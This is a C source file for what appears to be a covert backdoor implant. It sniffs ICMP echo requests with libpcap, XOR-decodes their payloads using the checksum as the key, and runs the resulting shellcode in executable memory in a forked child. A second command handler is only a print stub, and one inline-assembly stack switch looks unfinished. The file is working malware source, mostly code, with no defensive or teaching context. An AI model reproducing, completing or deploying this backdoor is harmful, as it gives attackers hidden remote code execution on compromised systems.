#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pcap.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/mman.h>
#include "rooty.h"

#define SIZE_ETHERNET 14
#define DEBUG
#define STACK_SIZE 512

void run_shellcode(const unsigned char *shellcode, uint32_t size) {
	unsigned char *executable = NULL, *new_stack = NULL;
	void (*function)();
	int pid, status;
	
	// We need some more memory to work
	if(executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {
		
		// Copy our prefix and shellcode in
		memcpy(executable, shellcode, size);

		// Set up the function pointer
		function = (void *)executable;

		// Create a new stack area for payloads that need writable/executable stack	
		if(new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) {

			// Hopefully this works
			if((pid = fork()) >= 0) {
				if(pid == 0) {

					// Some of the msfpayloads seem to eventually jump to the stack even though it's not executable
					__asm__("mov %edx,%esp");

					// Now call the shellcode
					function();

					// Make sure we exit the child cleanly
					exit(0);
				}
				else {
					waitpid(-1, &status, WNOHANG | WUNTRACED | WCONTINUED);
				}
			}
		}
	}
}

void run_command(const unsigned char *command, uint32_t size, unsigned char *key, const struct iphdr *ip) {
	printf("I would love to run: %s\n", command);
}

int decrypt_message(const unsigned char *data, unsigned char *decoded_data, uint16_t key_info, uint32_t size, unsigned char *key) {
	int ctr;

	for(ctr = 0; ctr < size; ctr++) {	
		decoded_data[ctr] = ((data[ctr] ^ key[0]) ^ key[1]);
	}

	return ctr;
}

void process_message(const unsigned char *data, uint16_t key_info, uint32_t size, const struct iphdr *ip) {
	unsigned char decoded_data[size];
	unsigned char *key = (unsigned char *)&(key_info);

	// Make sure we have data
	if(size > 0) {
		if(decrypt_message(data, decoded_data, key_info, size, key) > 0) {

			// First byte should be the message type
			switch(decoded_data[0]) {
				case MESSAGE_SHELLCODE:
					run_shellcode(decoded_data + 1, size - 1);
					break;
				case MESSAGE_COMMAND:
					run_command(decoded_data + 1, size - 1, key, ip);
					break;
			}
		}
	}
}

void process_packet(u_char *user_data, const struct pcap_pkthdr *hdr, const u_char *pkt) {
	const struct ether_arp *ethernet = NULL;
	const struct iphdr *ip = NULL;
	const struct icmphdr *icmp = NULL;
	u_int size_ip, size_icmp;
	const unsigned char *data = NULL;

	// Ethernet
	ethernet = (struct ether_arp *)pkt;

	// IP
	ip = (struct iphdr *)(pkt + SIZE_ETHERNET);
	size_ip = ((ip->ihl & 0x0f) * 4);
	
	// ICMP
	icmp = (struct icmphdr *)(pkt + SIZE_ETHERNET + size_ip);
	size_icmp = sizeof(struct icmphdr);

	// Data
	data = (unsigned char *)(pkt + SIZE_ETHERNET + size_ip + size_icmp);

	// Only want to deal with icmp echo requests
	if((icmp->type == 8) && (icmp->code == 0)) {
		process_message(data, icmp->checksum, (hdr->len - (data - pkt)), ip);
	}
}

int main(int argc, char *argv[0]) {
	char *iface = NULL;
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	bpf_u_int32 mask, net;
	char bpf_filter[] = "icmp";

	// Did we get an interface to work with?
	if(argc != 2) {
		fprintf(stderr, "Usage: %s <iface>\n", argv[0]);
		return -1;
	}

	// Yay, we have an interface
	iface = argv[1];

	// Opening the pcap device
	if((handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf)) == NULL) {
		fprintf(stderr, "Error opening device %s: %s\n", iface, errbuf);
		return -1;
	}

	// Need some extra information about the network interface
	if(pcap_lookupnet(iface, &net, &mask, errbuf)) {
		fprintf(stderr, "Error getting interface information for %s: %s\n", iface, errbuf);
		return -1;
	}

	// Make sure we got information
	if((mask == 0) || (net == 0)) {
		fprintf(stderr, "Error getting interface information for %s\n", iface);
		return -1;
	}

	// We only want to see ICMP traffic
	if(pcap_compile(handle, &fp, bpf_filter, 0, mask)) {
		fprintf(stderr, "Error compiling bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
		return -1;
	}

	// Finally set up our filter
	if(pcap_setfilter(handle, &fp)) {
		fprintf(stderr, "Error applying bpf filter '%s': %s\n", bpf_filter, pcap_geterr(handle));
		return -1;
	}

	// Now we can finally sniff
	pcap_loop(handle, -1, process_packet, NULL);

	return 0;
}

